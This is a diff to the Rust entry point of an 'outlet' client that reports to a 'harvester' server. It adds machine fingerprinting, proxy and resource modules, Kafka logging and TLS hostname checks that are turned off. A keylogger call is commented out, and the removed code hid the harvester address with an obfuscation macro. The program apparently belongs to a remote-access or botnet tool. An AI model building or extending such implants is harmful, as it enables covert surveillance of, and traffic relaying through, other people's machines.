@@ -4,15 +4,17 @@ use std::{
     time::Duration,
 };
 
+use envconfig::Envconfig;
 use log::info;
-use muddy::muddy;
-use once_cell::sync::Lazy;
+use machine_uid::machine_id::get_machine_id;
+use oxalate_env::load_env_vars;
+use oxalate_init::{init_kafka_producer, init_logger};
+use rand::RngExt;
+use rand::distr::Alphanumeric;
 use reqwest::{
     Client,
     header::{HeaderMap, HeaderValue},
 };
-
-mod http_logger;
 
 mod uptime_pinger;
 pub use uptime_pinger::uptime_pinger;
@@ -26,53 +28,94 @@ pub use proxy::proxy;
 mod resources;
 pub use resources::resources;
 
-use log_json_serializer::parse_log;
+#[derive(Envconfig)]
+pub struct EnvVars {
+    #[envconfig(from = "RUST_LOG", default = "info")]
+    pub rust_log: String,
 
-use crate::http_logger::HttpLogger;
+    #[envconfig(from = "PUBLIC_HARVESTER_PORT", default = "6767")]
+    pub public_harvester_port: u16,
 
-static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
-static MACHINE_ID: Lazy<String> =
-    Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));
-// const REQ_FEEDBACK_SPEED_SECS: u64 = 60;
+    #[envconfig(from = "HARVESTER_DNS", default = "oxalate_harvester")]
+    pub public_harvester_dns: String,
 
-pub struct GlobalState {
-    request_counter: AtomicU64,
+    // kafka
+    #[envconfig(from = "KAFKA_PORT", default = "19092")]
+    pub kafka_port: u16,
+
+    #[envconfig(from = "KAFKA_DNS")] // , default = "oxalate_redpanda"
+    pub kafka_dns: Option<String>, // depending if this is none you can disable kafka logging
+
+    #[envconfig(from = "KAFKA_MESSAGE_TIMEOUT_MS", default = "5000")]
+    pub kafka_message_timeout_ms: u64,
+
+    #[envconfig(from = "KAFKA_OUTLET_LOGS_TOPIC", default = "harvester_logs")]
+    pub kafka_outlet_logs_topic: String,
+
+    // Postgres
+    #[envconfig(from = "POSTGRES_USER")]
+    pub postgres_user: String,
+    #[envconfig(from = "POSTGRES_PASSWORD")]
+    pub postgres_password: String,
+    #[envconfig(from = "POSTGRES_DB")]
+    pub postgres_db: String,
+
+    #[envconfig(from = "DB_DNS", default = "oxalate-paradedb")]
+    pub db_dns: String,
+    #[envconfig(from = "DB_PORT", default = "6666")]
+    pub db_port: u16,
+    #[envconfig(from = "POOL_MAX_CONN", default = "25")]
+    pub pool_max_conn: u32,
+}
+
+#[derive(Clone)]
+pub struct AppState {
+    request_counter: Arc<AtomicU64>,
+    machine_id: &'static str,
+    env_vars: &'static EnvVars,
 }
 
 #[tokio::main]
 async fn main() {
-    fern::Dispatch::new()
-        .format(|out, message, record| {
-            out.finish(format_args!(
-                "{}",
-                parse_log(message, record).expect("failed to serialize log into json")
-            ));
-        })
-        .level(log::LevelFilter::Info)
-        .chain(std::io::stdout())
-        .chain(
-            fern::Dispatch::new()
-                .filter(|metadata| {
-                    let target = metadata.target();
-                    !target.starts_with("hyper")
-                        && !target.starts_with("reqwest")
-                        && !target.starts_with("h2")
-                        && !target.starts_with("tower")
-                        && !target.starts_with("rustls")
-                })
-                .chain(fern::Output::writer(Box::new(HttpLogger::new()), "")),
-        )
-        .apply()
-        .unwrap();
+    let env_vars: &'static EnvVars = load_env_vars();
 
-    info!("outlet inited with machine id: {:?}", *MACHINE_ID);
+    let machine_id = {
+        let machine_id = get_machine_id().unwrap_or("unknown".into());
+        let runtime_rng: String = rand::rng()
+            .sample_iter(&Alphanumeric)
+            .take(32)
+            .map(char::from)
+            .collect();
+        Box::new(format!("{machine_id}@{runtime_rng}")).leak() as &'static str
+    };
 
-    let global_state = Arc::new(GlobalState {
-        request_counter: 0.into(),
-    });
+    let producer = match env_vars.kafka_dns.as_ref() {
+        Some(dns) => {
+            let p =
+                init_kafka_producer(dns, env_vars.kafka_port, env_vars.kafka_message_timeout_ms)
+                    .await
+                    .expect("failed to init kafka producer");
+            Some(p)
+        }
+        None => None,
+    };
+
+    init_logger(
+        env_vars.kafka_outlet_logs_topic.to_owned(),
+        producer.to_owned(),
+    )
+    .await;
+
+    info!("outlet inited with machine id: {:?}", machine_id);
+
+    let global_state = AppState {
+        request_counter: Arc::new(0.into()),
+        machine_id,
+        env_vars,
+    };
 
     let mut headers = HeaderMap::new();
-    headers.insert("machine-id", HeaderValue::from_str(&MACHINE_ID).unwrap());
+    headers.insert("machine-id", HeaderValue::from_str(machine_id).unwrap());
     let reqwest_client = Client::builder()
         .default_headers(headers)
         .danger_accept_invalid_hostnames(true)
@@ -84,10 +127,10 @@ async fn main() {
         .build()
         .unwrap();
 
-    uptime_pinger();
+    uptime_pinger(global_state.to_owned());
     // keylogger(reqwest_client.to_owned());
     proxy(reqwest_client.to_owned(), global_state.to_owned());
-    resources(global_state.to_owned(), reqwest_client.to_owned());
+    // resources(reqwest_client.to_owned(), global_state.to_owned());
 
     info!("successfully inited, running forever!");
     pending::<()>().await;
